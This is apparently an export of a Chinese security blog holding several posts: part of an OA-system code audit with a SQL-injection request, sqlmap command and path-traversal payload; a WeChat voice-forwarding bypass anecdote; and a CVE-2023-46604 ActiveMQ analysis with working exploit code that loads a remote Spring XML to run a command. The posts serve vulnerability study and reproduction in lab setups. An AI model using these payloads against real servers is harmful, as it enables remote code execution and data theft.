<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /outaddresspaging HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Cookie: JSESSIONID=ED297E0C1F3E70B122CEEEA3481786D7</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Referer: http://127.0.0.1/addrmanage</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">alph=ALL&amp;outtype=&amp;baseKey=qwe</span><br></pre></td></tr></table></figure>

<p>保存数据包到txt文件，使用sqlmap一把梭，命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r “oasys.txt” -v 3 -level=5</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7442f7b72e.png"  alt="image-20240129142239166"></p>
<p>剩下还有一个可以sql注入的功能在<strong>通知列表</strong>、审计方法相同这就贴几张图不细说了</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93fde585bf.png"  alt="image-20240131022845828"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b73906306eb.png"  alt="image-20240129133501697"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7386ed8fb1.png"  alt="image-20240129133230547"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b739747c511.png"  alt="image-20240129133652095"></p>
<h3 id="03、任意文件读取"><a href="#03、任意文件读取" class="headerlink" title="03、任意文件读取"></a>03、任意文件读取</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b941321b7e9.png"  alt="image-20240131023426210"></p>
<p>这块有俩其实都一样，咱就挑一个分析就OK</p>
<p>这块是直接给出了有风险的代码位置<code>oa_system-master/src/main/java/cn/gson/oasys/controller/user/UserpanelController.java</code>方法名<code>image</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b941b3b3ac7.png"  alt="image-20240131023635884"></p>
<p>projectPath：当前项目路径</p>
<p>startpath：获取请求URI</p>
<p>这块唯一的处理就是把URI中的<code>/images</code>替换为空，之后就创建<code>file</code>对象</p>
<p>也没有对文件内容做啥检测就输出了</p>
<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/image//image..//image..//image..//image..//image..//image../test.txt</span><br></pre></td></tr></table></figure>

<p>新建一个测试文件</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b943675e214.png"  alt="image-20240131024350969"></p>
<p>成功读取到桌面文件</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9450b63fcd.png"  alt="image-20240131025051402"></p>
<p>具体的payload还要看自己在配置文件中的<code>rootpath</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945a63193d.png"  alt="image-20240131025325982"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /image//image..//image..//image..//image..//image..//image../test.txt HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Cookie: JSESSIONID=ED297E0C1F3E70B122CEEEA3481786D7</span><br><span class="line">Referer: http://127.0.0.1/addrmanage</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="04、文件上传"><a href="#04、文件上传" class="headerlink" title="04、文件上传"></a>04、文件上传</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b948270eae4.png"  alt="image-20240131030407154"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9483ce28ef.png"  alt="image-20240131030429057"></p>
<p>这里提到最多的还是文件上传，我们找一个跟进去看看</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b948b794156.png"  alt="image-20240131030631749"></p>
<p>通过审计我们可以看到这块确实没有对文件后缀进行一些过滤。导致任意文件上传</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b949a047369.png"  alt="image-20240131031024684"></p>
<p>但是作者这块使用uuid重新生成了文件名，并且上传文件存在静态文件夹。并且不会返回文件路径。so目前貌似没有危害</p>
<p>若我们可以找到文件包含这类漏洞并且得知文件名则可以getshell。</p>
<p><strong>深入：</strong></p>
<p>抱着不漏掉的原则，就又看了看其他的上传点。发现一个上传头像处回显地址</p>
<p>漏洞地址：<code>oa_system-master/src/main/java/cn/gson/oasys/services/user/NotepaperService.java</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95634b57c5.png"  alt="image-20240131040404783"></p>
<p>是一个<code>services</code>，那就向上追溯寻找调用处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b958e0afc76.png"  alt="image-20240131041528902"></p>
<p>在系统中找到位置在用户面板中个人设置处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95a324cba4.png"  alt="image-20240131042106283"></p>
<p>使用刚刚越权创建的账号test上传一个js或者pdf文件，咱就直接用js</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95ac1ad656.png"  alt="image-20240131042329889"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95b0f5b20a.png"  alt="image-20240131042447042"></p>
<p>之后再用户管理处就可以看到src中是文件地址。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b959dacefba.png"  alt="image-20240131041938816"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95ba40d6aa.png"  alt="image-20240131042714881"></p>
<h3 id="05、其他"><a href="#05、其他" class="headerlink" title="05、其他"></a>05、其他</h3><p>这个站还有一些别的漏洞，如：储存性xss、csrf、越权读取、越权删除等漏洞。网上都可以搜到相关文章、这里就不过多阐述！</p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>自动化工具在审计的过程中也只是起到辅助作用。在进行代码审计时，手工审计和自动化工具的结合使用通常是更有效的方法。</p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>被隔壁房间女人叫声吵醒后引起的wx权限绕过</title>
    <url>/blog/2024/02/27/240227%E5%BE%AE%E4%BF%A1%E8%AF%AD%E9%9F%B3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>今天早上本来在酒店睡得正香嘞，然后被隔壁房间的声音吵醒了。最近不是大学开学，所以是具体被什么声音吵醒就不多做解释了。但是能把四点才睡觉的我不到10点就吵醒，那声音肯定不是一般的大。so、Yu9肯定要跟朋友吐槽一下。当时是直接微信语音录的先发给了小号，想着后边在转发！</p>
<p>不过后边发现微信语音没有转发的功能！就到网上找到了一些教程，比如：<code>收藏-&gt;转笔记，就可以转发</code>，但是试了一下不行啊！</p>
<p>猜测是新版微信做了限制！会提示“无法转发包含语音的消息内容”</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd898aaa89f.png"  alt="image-20240227150440601"></p>
<p>咱是干嘛的，搞安全的啊！虽然很菜吧，但就还是忍不住的想试试绕过！后边也是成功绕过了！</p>
<p>不过咱感觉这都不算是漏洞，但在朋友的怂恿下还是试着交了一下。（最后被忽略了！）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd8a938c7ca.png"  alt="image-20240227150905267"></p>
<p>那就分享一下绕过的过程吧！</p>
<p>1）收藏转笔记后，可以看到有这么多操作</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd3fce188e5.png"  alt="image-20240227095003432"></p>
<p>2）直接转发已经试过行不通，看了看剩下的，那能测的功能点就剩<code>分享到朋友圈</code>，那就继续</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd4164879ab.png"  alt="image-20240227095650480"></p>
<p>3）就在朋友圈点进去后可以转发了，选择发送给朋友！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd41d45e346.png"  alt="image-20240227095842316"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd42193c3d9.png"  alt="image-20240227095951060"></p>
<p>故事到这里也就结束了！最后也是成功分享给了我的好兄弟！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/27/65dd8c9092b77.png"  alt="image-20240227151734680"></p>
<p>后边经过测试<code>苹果</code>手机貌似不行</p>
<p>最后，如果有兄弟想听一下这离谱到能给一个四点才睡觉的人不到十点就吵醒的声音，私我发你！</p>
]]></content>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</title>
    <url>/blog/2024/03/02/240302CVE-2023-46604-ApacheActiveMQ-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache ActiveMQ 是美国（Apache）基金会的一套开源的消息中间件，它支持 Java 消息服务、集群、Spring Framework 等。</p>
<p>ActiveMQ 默认开放了 61616 端口用于接收 OpenWire 协议消息，由于针对异常消息的处理存在反射调用逻辑，攻击者可能通过构造恶意的序列化消息数据加载恶意类，执行任意代码。</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>Apache ActiveMQ &lt; 5.18.3<br>Apache ActiveMQ &lt; 5.17.6<br>Apache ActiveMQ &lt; 5.16.7<br>Apache ActiveMQ &lt; 5.15.16</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p><strong>activemq-5.18.2</strong></p>
<p>版本：activemq-5.18.2</p>
<p>地址：<a class="link"   href="https://activemq.apache.org/components/classic/download/classic-05-18-02" >https://activemq.apache.org/components/classic/download/classic-05-18-02<i class="fas fa-external-link-alt"></i></a></p>
<p>进到bin目录下，使用<code>activemq start</code>命令启动</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/25/65da3cab3dbd2.png"  alt="image-20240225025954345"></p>
<p>访问<a href="http://ip:8161，admin/admin。访问到如下页面搭建成功">http://ip:8161，admin/admin。访问到如下页面搭建成功</a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/25/65da3d9c1e787.png"  alt="image-20240225030355524"></p>
<p><strong>javaDemo</strong></p>
<p>导入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.activemq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activemq-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.18.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>javaDemo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;Yu9_Activemq&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        producer.send(message);</span><br><span class="line">		System.out.println(<span class="string">&quot;消息发送成功&quot;</span>);</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后出现如下场景就是创建成功！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/25/65da466bc44e0.png"  alt="image-20240225034131239"></p>
<h2 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h2><p>可以看到新版的修复是在<code>org.apache.activemq.openwire.v(1).BaseDataStreamMarshaller#createThrowable</code></p>
<p>参考：<a class="link"   href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f" >https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e0c8cf80fe4.png"  alt="image-20240301014329293"></p>
<p>先不管这块如何修复的（后边再分析），从左边这块就可以看出来：若ClassName 和 message 可控，那就可以调用任意类的 String 构造方法</p>
<p>然后，AvtiveMQ 内置 Spring，结合 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 加载远程配置文件实现 SPEL 表达式注入。</p>
<p>所以现在七七八八可以确定<code>createThrowable</code>就是触发点，那现在就向上寻找调用链</p>
<p>继续寻找createThrowable&#96;的调用处</p>
<p><code>ALT+F7</code>，可以看到被两个方法调用了，在<code>org.apache.activemq.openwire.v1.BaseDataStreamMarshaller</code>包下的<code>tightUnmarsalThrowable/looseUnmarsalThrowable</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1da09e79c8.png"  alt="image-20240301213713274"></p>
<p>我们先以 <code>looseUnmarsalThrowable</code> 为例，继续向上寻找</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1dc0fef722.png"  alt="image-20240301214551996"></p>
<p>网上大部分都选用了 <code>ExceptionResponseMarshaller</code>，<code>org.apache.activemq.openwire.v1.ExceptionResponseMarshaller#looseUnmarshal</code>，咱也就站在巨人的肩膀上，也分析它</p>
<p>到目前咱们的链子还是很清晰的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExceptionResponseMarshaller#looseUnmarshal</span><br><span class="line">	BaseDataStreamMarshaller#looseUnmarsalThrowable</span><br><span class="line">		BaseDataStreamMarshaller#createThrowable</span><br></pre></td></tr></table></figure>

<p>接着顺着这个链子我们在详细分析一下：</p>
<p>1）<code>ExceptionResponseMarshaller</code> 顾名思义就是对 <code>ExceptionResponse</code> 进行序列化&#x2F;反序列化的类</p>
<p><code>ExceptionResponseMarshaller</code> 这个类, 它是 <code>BaseDataStreamMarshaller</code> 的子类，其中<code>tightUnmarshal/looseUnmarshal</code> 方法会调用 <code>tightMarshalThrowable/looseMarshalThrowable</code>, 最终调用到 <code>BaseDataStreamMarshaller#createThrowable</code> 方法</p>
<p>2）在<code>BaseDataStreamMarshaller</code>中有若干 Marshal&#x2F;unmarshal 方法，接下来看看<code>BaseDataStreamMarshaller#looseUnmarsalThrowable</code>，在方法内部会获取 clazz 和 message, 然后调用 createThrowable</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1e730d5171.png"  alt="image-20240301223320971"></p>
<p>找到对应的<code>looseMarshalThrowable</code>，这块就是将 o 的 className 和 message 写入序列化流</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1e990c9c76.png"  alt="image-20240301224328468"></p>
<p>在往上边跟进一下走到<code>looseMarshal</code>，就可以得知：<code>o(继承了 Throwable)</code> 就是 <code>ExceptionResponse</code> 里面的 <code>exception</code> 字段</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1efe77c4a8.png"  alt="image-20240301231031534"></p>
<p>到这里思路其实已经差不多了, 我们只需要构造一个 ExceptionResponse 然后发给 ActiveMQ 服务器, 之后 ActiveMQ 会自己调用 unmarshal, 最后触发 createThrowable</p>
<h2 id="0x05-调试"><a href="#0x05-调试" class="headerlink" title="0x05 调试"></a>0x05 调试</h2><p>回到链子的最顶端，<code>ExceptionResponseMarshaller#looseUnmarshal</code>，继续往上跟，然后走到了<code>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/01/65e1f1430deaa.png"  alt="image-20240301231619232"></p>
<p>就在这块下个断点，使用上边的demo，然后我们调试一下 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;Yu9_Activemq&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        producer.send(message);</span><br><span class="line"></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先获取 <code>dataType</code>, 然后根据它的值去 <code>this.dataMarshallers</code> 里面获取对应的序列化器</p>
<p>而 <code>ExceptionResponse</code> 的 <code>dataType</code> 是 31, 对应上图中的 <code>ExceptionResponseMarshaller</code></p>
<p>获取到了对应的序列化器之后, 会调用它的 <code>tightUnmarshal / looseUnmarshal</code> 方法进一步处理 <code>Message</code> 内容</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/02/65e20065b4452.png"  alt="image-20240302002053921"></p>
<p>对于不同的 Message 类型, 有对应序列化器会单独进行处理</p>
<p>所以现在的思路就是如何发送一个经过<code>ExceptionResponseMarshaller</code>处理的 <code>ExceptionResponse</code></p>
<p>到这块基本咱就不太行了，后边的思路都是跟着X1r0z 师傅的分析来的 <a class="link"   href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/" >https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a> </p>
<p>在 <code>org.apache.activemq.openwire.OpenWireFormat#marshal</code> 系列方法下断点，往前可以看到 TcpTransport 这个类</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/02/65e204ffc9155.png"  alt="image-20240302004032093"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        checkStarted();</span><br><span class="line">        wireFormat.marshal(command, dataOut);</span><br><span class="line">        dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>oneway</code> 方法会调用 <code>wireFormat.marshal()</code> 去序列化 <code>command</code></p>
<p>command 就是前面准备发送的 Message, 而 wireFormat 就是和它对应的序列化器</p>
<p>那么我们只需要手动 patch 这个方法, 将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可</p>
<p>在当前源码目录下新建一个 <code>org.apache.activemq.transport.tcp.TcpTransport</code> 类, 然后重写对应的逻辑, 这样在运行的时候, 因为 classpath 查找顺序的问题, 程序就会优先使用当前源码目录里的 TcpTransport 类</p>
<p>因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 ClassPathXmlApplicationContext 加载 XML 实现 RCE</p>
<p><strong>TcpTransport.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8084/poc.xml&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">    wireFormat.marshal(response, dataOut);</span><br><span class="line">    dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上边分析过o对象需继承<code>Throwable</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/02/65e2066d8ae91.png"  alt="image-20240302004638019"></p>
<p>在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以这里同样需要 patch<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p>
<p><strong>ClassPathXmlApplicationContext.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>poc.xml</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">            &lt;constructor-arg &gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;calc.exe&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">            &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">    &lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>最后成功RCE</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/03/02/65e208106836c.png"  alt="image-20240302005336997"></p>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a class="link"   href="https://drun1baby.top/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" >https://drun1baby.top/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/" >https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/vuls/389184.html" >https://www.freebuf.com/vuls/389184.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>PB-CMS代码审计</title>
    <url>/blog/2024/03/05/240304PB-CMS/</url>
    <content><![CDATA[<p><strong>文章首发先知社区</strong></p>
<p><strong>链接：<a class="link"   href="https://xz.aliyun.com/t/13867" >https://xz.aliyun.com/t/13867<i class="fas fa-external-link-alt"></i></a></strong></p>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本次审计的系统是PB-CMS（瀑布内容管理系统），涉及到的技术栈有SpringBoot、Apache Shiro、Mybatis Plus 、Thymeleaf 等等，在它的 v1.0.0版本中存在一些经典的漏洞，<code>Yu9</code>相信刚开始学习java代码审计的师傅通过审计该cms可以收获不少知识。</p>
